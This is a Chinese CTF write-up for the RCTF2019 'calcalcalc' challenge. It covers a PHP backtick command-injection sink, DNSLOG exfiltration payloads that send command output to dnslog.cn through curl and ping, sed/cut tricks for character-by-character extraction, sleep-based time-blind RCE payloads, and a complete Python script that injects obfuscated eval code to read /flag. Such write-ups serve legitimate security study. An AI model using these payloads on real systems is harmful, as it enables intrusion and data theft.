# [RCTF2019]calcalcalc 命令执行的时间盲注

首先让我们多了解一些姿势

## DNSLOG注入攻击

![image-20210810210337783](web/points/image-20210810210337783.png)

这是一个常见的反引号代码执行

现在将代码修改为：

```
<?php
highlight_file('index.php');
$cmd = $_GET['cmd'];
`$cmd`;
?>
```

我们知道命令肯定是shell_exec了，但关键是我们该如何得到该命令的回显呢？

经过网上冲浪，发现了两种方法，一种是用dns查询，一种是利用curl命令

下面是我的尝试复现过程

- ### 在vps布置上述的代码


```
为了方便调试加了一行
<?php
highlight_file('index.php');
$cmd = $_GET['cmd'];
`$cmd`;
echo `$cmd`;
?>
```

- ### http://www.dnslog.cn/ 上请求临时域名

（个人域名注册备案过程实在是有点繁琐，等域名备案完成后我会再次尝试）

![1](web/points/1.png)

截图是这样的

### 然后在网站上请求

```
/?cmd=curl%20`whoami`.e4bj32.dnslog.cn

或者是

ping%20`ls`.e4bj32.dnslog.cn
```

然后我们能看见上面的结果。

执行了ls命令并且返回了查询到的第一条信息，但是问题是这并不完整。

在sql中我们可以使用limit来确定偏移量，那么在linux中有什么方法呢？

## SED

Linux sed 命令是利用脚本来处理文本文件。

sed 可依照脚本的指令来处理、编辑文本文件。

Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。

```
-n, --quiet, --silent
               suppress automatic printing of pattern space
-e script, --expression=script
               add the script to the commands to be executed
-f script-file, --file=script-file
               add the contents of script-file to the commands to be executed
--follow-symlinks
               follow symlinks when processing in place
-i[SUFFIX], --in-place[=SUFFIX]
               edit files in place (makes backup if SUFFIX supplied)
-l N, --line-length=N
               specify the desired line-wrap length for the `l' command
--posix
               disable all GNU extensions.
-r, --regexp-extended
               use extended regular expressions in the script.
-s, --separate
               consider files as separate rather than as a single continuous
               long stream.
-u, --unbuffered
               load minimal amounts of data from the input files and flush
               the output buffers more often
-z, --null-data
               separate lines by NUL characters
    --help     display this help and exit
    --version  output version information and exit
    
    
参数说明：
    -e<script>或--expression=<script> 以选项中指定的script来处理输入的文本文件。
    -f<script文件>或--file=<script文件> 以选项中指定的script文件来处理输入的文本文件。
    -h或--help 显示帮助。
    -n或--quiet或--silent 仅显示script处理后的结果。
    -V或--version 显示版本信息。

动作说明：

    a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～
    c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！
    d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚；
    i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；
    p ：打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～
    s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g 就是啦！ 
```

![kali-2021-08-11-14-00-38](web/points/kali-2021-08-11-14-00-38.png)

我们再尝试一下`ls | sed -n '1p'`

![2](web/points/2.png)

成功查看到了ls 指令的其他内容。

*打出来的信息可能会受到长度的限制，这又该如何解决呢？*

## cut

```
-b, --bytes=LIST        select only these bytes
-c, --characters=LIST   select only these characters
-d, --delimiter=DELIM   use DELIM instead of TAB for field delimiter
-f, --fields=LIST       select only these fields;  also print any line
                          that contains no delimiter character, unless
                          the -s option is specified
-n                      (ignored)
    --complement        complement the set of selected bytes, characters
                          or fields
-s, --only-delimited    do not print lines not containing delimiters
    --output-delimiter=STRING  use STRING as the output delimiter
                          the default is to use the input delimiter
-z, --zero-terminated    line delimiter is NUL, not newline
    --help     display this help and exit
    --version  output version information and exit


参数:

    -b ：以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了 -n 标志。
    -c ：以字符为单位进行分割。
    -d ：自定义分隔符，默认为制表符。
    -f ：与-d一起使用，指定显示哪个区域。
    -n ：取消分割多字节字符。仅和 -b 标志一起使用。如果字符的最后一个字节落在由 -b 标志的 List 参数指示的
    范围之内，该字符将被写出；否则，该字符将被排除
```

我们再来尝试：`ls | sed -n '3p' | cut -c 3`![kali-2021-08-11-14-10-04](web/points/kali-2021-08-11-14-10-04.png)

## Time-Based-RCE

提交：

```
?cmd=if [1=1];then sleep 10;fi
//真，浏览器沉默10s
?cmd=if [1=2];then sleep 10;fi
//假，浏览器立即响应
```

类似sql注入的时间盲注，利用响应时间来判断，我们就可以达到匹配字符的目的，利用后端来帮我们猜解答案

因此 payload:

```
?cmd = if [$(whoami|base32|cut –c 1)=O];then sleep 10;fi
```

## calcalcalc

写完了没点保存，看payload理解吧

```
import requests
from time import time

url = 'http://6816f9f6-a412-4c2b-bf5b-85130b7d25e4.node4.buuoj.cn:81/calculate'


def encode(payload):
    return 'eval(%s)' % ('+'.join('chr(%d)' % ord(c) for c in payload))


def query(bool_expr):
    payload = "__import__('time').sleep(5) if %s else 1" % bool_expr
    t = time()
    r = requests.post(url, json={'isVip': True, 'expression': encode(payload)})
    # print(r.text)
    delta = time() - t
    print(payload, delta)
    return delta > 5

def binary_search(geq_expression, l, r):
    eq_expression = geq_expression.replace('>=', '==')
    while True:
        if (r - l) < 4:
            for mid in range(l, r + 1):
                if query(eq_expression.format(num=mid)):
                    return mid
            else:
                print('NOT FOUND')
                return
        mid = (l + r) // 2
        if query(geq_expression.format(num=mid)):
            l = mid
        else:
            r = mid

# flag_len = binary_search("len(open('/flag').read())>={num}", 0, 100)
flag_len = 50
print('flag length: %d' % flag_len)

flag = ''
while len(flag) < flag_len:
    c = binary_search("ord(open('/flag').read()[%d])>={num}" % len(flag), 0, 128)
    if c:   # the bs may fail due to network issues
        flag += chr(c)
    print(flag)
```

这个是预期解

https://www.xctf.org.cn/library/details/6cf4733304d816ebb21ff2e4c810ee90ccb7f97f/